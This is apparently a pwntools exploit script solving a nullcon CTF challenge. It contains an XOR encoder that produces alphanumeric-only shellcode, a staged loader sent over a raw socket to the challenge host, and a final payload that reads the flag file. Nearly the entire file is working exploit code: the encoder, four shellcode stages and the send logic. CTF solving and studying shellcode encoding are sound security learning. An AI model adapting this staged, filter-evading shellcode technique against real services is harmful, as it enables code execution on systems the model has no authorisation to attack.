from pwn import *
from heaputils import *
from socket import *

CHSET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"

context.os = 'linux'
context.arch = 'amd64'

class XOREncoder():
	#assumes initial rax to be NULL, sc must be given as bytearray, not string
	def __init__(self,sc,offset,initial_al=0):
		self.al = initial_al
		self.code = ""
		self.shellcode = sc
		self.offset = offset
		for x in range(offset,offset+len(sc)):
			assert(chr(x) in CHSET)

	def compute(self):
		TOTAL = len(self.shellcode)
		for i,ch in enumerate(self.shellcode):
			if (i+self.offset)%2 == 0:
				original_char = ord("P")
			else:
				original_char = ord("Z")

			intermediates = self.find_xor_inters(ch^original_char)
			for x in intermediates:
				self.code += "xor al, {}\n".format(x)
			self.code += "xor byte ptr [rcx+{}],al\n".format(self.offset+i)
			self.al = ch^original_char
			log.info("computed %d/%d chars"%(i+1,TOTAL))

		# turn al back to 0
		intermediates = self.find_xor_inters(0)
		for x in intermediates:
			self.code += "xor al, {}\n".format(x)

	def find_xor_inters(self,final):
		inters = []
		temp = self.al

		while True:
			if(chr(temp^final) in CHSET):
				inters.append(temp^final)
				break
			med = ord(random.choice(CHSET)) #lazy coding
			temp = temp^med
			inters.append(med)

		return inters


	def dump_asmcode(self):
		return self.code



RADDR = ("pwn.ctf.nullcon.net", 4011)
#RADDR = ("localhost",4011)
p = socket(AF_INET,SOCK_STREAM)
p.connect(RADDR)
log.success("connected to remote address")

stage2_d = ''' 
push rcx
push rcx
pop rsi
push rax
pop rdi
xor al,0x7F
push rax
pop rdx
xor al,0x7F
syscall
'''

stage2 = asm(stage2_d)
assert len(stage2)<=26
encoder = XOREncoder(bytearray(stage2),0x41)

log.info("generating alphanumeric shellcode...")
encoder.compute()
log.info("done generating alphanumeric shellcode")

NOP_E = "PZ"
NOP_O = "QAX"

#XOR encode: requires a single bit bruteforce
stage1_d = '''
push rax
push rdi
pop rax
xor ax,0x3030 
xor al,0x30
push rax
pop rcx
pop rax
'''

stage1_d+=encoder.dump_asmcode()
stage1 = asm(stage1_d)

if(len(stage1)%2==1):
	stage1 += NOP_O

L = len(stage1)
assert(L%2==0)
L = (0x4000-L)//2

stage1 += NOP_E*(L-1)

for x in stage1:
	assert(x in CHSET)

log.info("checked for alphanumeric-ness")

numbytes = p.send(stage1)
log.info("sent %d bytes to remote address (stage1 & stage2)"%numbytes)

stage3_d = '''
xor rax,rax
mov rdx,0x1000
syscall
'''

stage3 = asm(stage3_d)
numbytes = p.send("\x90"*0x4d+stage3)
log.info("sent %d bytes to remote address (stage3)"%numbytes)



stage4_d = shellcraft.amd64.linux.cat("flag")
stage4 = asm(stage4_d)
numbytes = p.send("\x90"*0x7F+stage4)
log.info("sent %d bytes to remote address (stage4)"%numbytes)

data = ""
while True:
	try:
		new = p.recv(0x1000)
		L = len(new)
		log.info("received: %s(%d bytes)"%(new,L))
		data += new
	except:
		break

print(data)

